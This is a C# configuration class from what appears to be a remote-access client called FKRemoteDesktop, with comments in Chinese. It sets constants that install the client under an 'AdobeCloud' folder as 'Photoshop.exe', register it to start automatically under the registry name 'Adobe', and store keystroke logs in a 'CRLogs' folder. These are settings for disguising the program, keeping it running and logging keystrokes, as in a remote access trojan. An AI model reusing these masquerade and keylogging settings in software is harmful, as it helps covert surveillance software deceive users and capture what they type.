using System;
using System.Windows.Forms;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Configs
{
    // 客户端的一些静态配置，可自由修改。它 和 SettingsFromServer 共同组成客户端配置信息
    public static class SettingsFromClient
    {
        public static string DIRECTORY = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static string VERSION = Application.ProductVersion;  // 客户端版本号（本地）

        public static string SUBDIRECTORY = "AdobeCloud";           // 客户端备份文件夹名（本地）
        public static string INSTALLNAME = "Photoshop.exe";         // 客户端备份的文件名（本地）
        public static string STARTUPKEY = "Adobe";                  // 客户端自启动项的注册表名（本地）
        public static string LOGDIRECTORYNAME = "CRLogs";           // 按键LOG文件夹名（本地）

        public static string INSTALLPATH = "";                      // 客户端备份的完整文件路径（不是配置，只是全局变量）
        public static string LOGSPATH = "";                         // 按键LOG的完整文件夹路径（不是配置，只是全局变量）
    }
}